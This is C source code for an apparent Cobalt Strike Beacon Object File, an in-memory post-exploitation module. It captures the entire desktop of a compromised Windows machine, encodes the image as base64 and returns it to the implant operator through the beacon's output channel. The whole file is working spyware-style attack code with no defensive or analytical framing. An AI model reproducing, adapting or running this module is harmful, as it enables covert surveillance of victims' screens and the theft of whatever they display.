/*
 * screenshot.c - Desktop screenshot BOF
 * Captures the current desktop screen and sends it back as BMP format.
 */

#include <windows.h>
#include "beacon.h"

// Import Windows APIs
DECLSPEC_IMPORT HDC WINAPI USER32$GetDC(HWND hWnd);
DECLSPEC_IMPORT int WINAPI USER32$ReleaseDC(HWND hWnd, HDC hDC);
DECLSPEC_IMPORT int WINAPI USER32$GetSystemMetrics(int nIndex);
DECLSPEC_IMPORT HDC WINAPI GDI32$CreateCompatibleDC(HDC hdc);
DECLSPEC_IMPORT HBITMAP WINAPI GDI32$CreateCompatibleBitmap(HDC hdc, int cx, int cy);
DECLSPEC_IMPORT HGDIOBJ WINAPI GDI32$SelectObject(HDC hdc, HGDIOBJ h);
DECLSPEC_IMPORT BOOL WINAPI GDI32$BitBlt(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
DECLSPEC_IMPORT BOOL WINAPI GDI32$DeleteObject(HGDIOBJ ho);
DECLSPEC_IMPORT BOOL WINAPI GDI32$DeleteDC(HDC hdc);
DECLSPEC_IMPORT int WINAPI GDI32$GetDIBits(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT void* WINAPI MSVCRT$memcpy(void *dest, const void *src, size_t n);
DECLSPEC_IMPORT int WINAPI MSVCRT$sprintf(char *buffer, const char *format, ...);

// Base64 encoding table
static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/*
 * Base64 encode `in_len` bytes from `in` into `out`.
 * Returns the number of output characters written.
 * Caller must ensure `out` has at least ((in_len+2)/3)*4 bytes.
 */
static int b64_encode(const unsigned char* in, int in_len, char* out) {
    int i, j = 0;
    for (i = 0; i + 2 < in_len; i += 3) {
        out[j++] = b64_table[(in[i] >> 2) & 0x3F];
        out[j++] = b64_table[((in[i] & 0x3) << 4) | ((in[i+1] >> 4) & 0xF)];
        out[j++] = b64_table[((in[i+1] & 0xF) << 2) | ((in[i+2] >> 6) & 0x3)];
        out[j++] = b64_table[in[i+2] & 0x3F];
    }
    if (i < in_len) {
        out[j++] = b64_table[(in[i] >> 2) & 0x3F];
        if (i + 1 < in_len) {
            out[j++] = b64_table[((in[i] & 0x3) << 4) | ((in[i+1] >> 4) & 0xF)];
            out[j++] = b64_table[((in[i+1] & 0xF) << 2)];
        } else {
            out[j++] = b64_table[((in[i] & 0x3) << 4)];
            out[j++] = '=';
        }
        out[j++] = '=';
    }
    return j;
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    int screenWidth = USER32$GetSystemMetrics(0);
    int screenHeight = USER32$GetSystemMetrics(1);

    if (screenWidth <= 0 || screenHeight <= 0) {
        BeaconOutput(CALLBACK_ERROR, "Failed to get screen dimensions", 31);
        return;
    }

    HDC hdcScreen = USER32$GetDC(NULL);
    if (!hdcScreen) {
        BeaconOutput(CALLBACK_ERROR, "Failed to get desktop DC", 25);
        return;
    }

    HDC hdcMem = GDI32$CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = GDI32$CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    HGDIOBJ hOld = GDI32$SelectObject(hdcMem, hBitmap);

    BOOL result = GDI32$BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, 0x00CC0020);

    if (!result) {
        BeaconOutput(CALLBACK_ERROR, "Failed to capture screen", 24);
        GDI32$SelectObject(hdcMem, hOld);
        GDI32$DeleteObject(hBitmap);
        GDI32$DeleteDC(hdcMem);
        USER32$ReleaseDC(NULL, hdcScreen);
        return;
    }

    BITMAPINFO bmi;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = -screenHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = 0;
    bmi.bmiHeader.biSizeImage = 0;
    bmi.bmiHeader.biXPelsPerMeter = 0;
    bmi.bmiHeader.biYPelsPerMeter = 0;
    bmi.bmiHeader.biClrUsed = 0;
    bmi.bmiHeader.biClrImportant = 0;

    int rowSize = ((screenWidth * 3 + 3) & ~3);
    DWORD imageSize = rowSize * screenHeight;

    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char* bitmapData = (char*)KERNEL32$HeapAlloc(hHeap, 0, imageSize);

    if (!bitmapData) {
        BeaconOutput(CALLBACK_ERROR, "Failed to allocate memory", 26);
        GDI32$SelectObject(hdcMem, hOld);
        GDI32$DeleteObject(hBitmap);
        GDI32$DeleteDC(hdcMem);
        USER32$ReleaseDC(NULL, hdcScreen);
        return;
    }

    int lines = GDI32$GetDIBits(hdcMem, hBitmap, 0, screenHeight, bitmapData, &bmi, 0);

    if (lines == 0) {
        BeaconOutput(CALLBACK_ERROR, "Failed to get bitmap bits", 26);
        KERNEL32$HeapFree(hHeap, 0, bitmapData);
        GDI32$SelectObject(hdcMem, hOld);
        GDI32$DeleteObject(hBitmap);
        GDI32$DeleteDC(hdcMem);
        USER32$ReleaseDC(NULL, hdcScreen);
        return;
    }

    DWORD fileHeaderSize = sizeof(BITMAPFILEHEADER);
    DWORD infoHeaderSize = sizeof(BITMAPINFOHEADER);
    DWORD totalSize = fileHeaderSize + infoHeaderSize + imageSize;

    char* bmpFile = (char*)KERNEL32$HeapAlloc(hHeap, 0, totalSize);
    if (!bmpFile) {
        BeaconOutput(CALLBACK_ERROR, "Failed to allocate BMP buffer", 30);
        KERNEL32$HeapFree(hHeap, 0, bitmapData);
        GDI32$SelectObject(hdcMem, hOld);
        GDI32$DeleteObject(hBitmap);
        GDI32$DeleteDC(hdcMem);
        USER32$ReleaseDC(NULL, hdcScreen);
        return;
    }

    BITMAPFILEHEADER* fileHeader = (BITMAPFILEHEADER*)bmpFile;
    fileHeader->bfType = 0x4D42;
    fileHeader->bfSize = totalSize;
    fileHeader->bfReserved1 = 0;
    fileHeader->bfReserved2 = 0;
    fileHeader->bfOffBits = fileHeaderSize + infoHeaderSize;

    MSVCRT$memcpy(bmpFile + fileHeaderSize, &bmi.bmiHeader, infoHeaderSize);
    MSVCRT$memcpy(bmpFile + fileHeaderSize + infoHeaderSize, bitmapData, imageSize);

    // Calculate base64 output size: ((totalSize + 2) / 3) * 4
    DWORD encodedLen = ((totalSize + 2) / 3) * 4;

    // Create header: === SCREENSHOT: WIDTHxHEIGHT ===\n
    char header[128];
    int headerLen = MSVCRT$sprintf(header, "=== SCREENSHOT: %dx%d ===\n", screenWidth, screenHeight);

    // Allocate output buffer: header + base64 + null terminator
    DWORD outputSize = headerLen + encodedLen;
    char* output = (char*)KERNEL32$HeapAlloc(hHeap, 0, outputSize + 1);

    if (!output) {
        BeaconOutput(CALLBACK_ERROR, "Failed to allocate output buffer", 33);
        KERNEL32$HeapFree(hHeap, 0, bmpFile);
        KERNEL32$HeapFree(hHeap, 0, bitmapData);
        GDI32$SelectObject(hdcMem, hOld);
        GDI32$DeleteObject(hBitmap);
        GDI32$DeleteDC(hdcMem);
        USER32$ReleaseDC(NULL, hdcScreen);
        return;
    }

    // Copy header
    MSVCRT$memcpy(output, header, headerLen);

    // Encode BMP to base64
    int actualEncoded = b64_encode((unsigned char*)bmpFile, totalSize, output + headerLen);
    output[headerLen + actualEncoded] = '\0';

    // Send output
    BeaconOutput(CALLBACK_OUTPUT, output, headerLen + actualEncoded);

    KERNEL32$HeapFree(hHeap, 0, output);
    KERNEL32$HeapFree(hHeap, 0, bmpFile);
    KERNEL32$HeapFree(hHeap, 0, bitmapData);
    GDI32$SelectObject(hdcMem, hOld);
    GDI32$DeleteObject(hBitmap);
    GDI32$DeleteDC(hdcMem);
    USER32$ReleaseDC(NULL, hdcScreen);
}
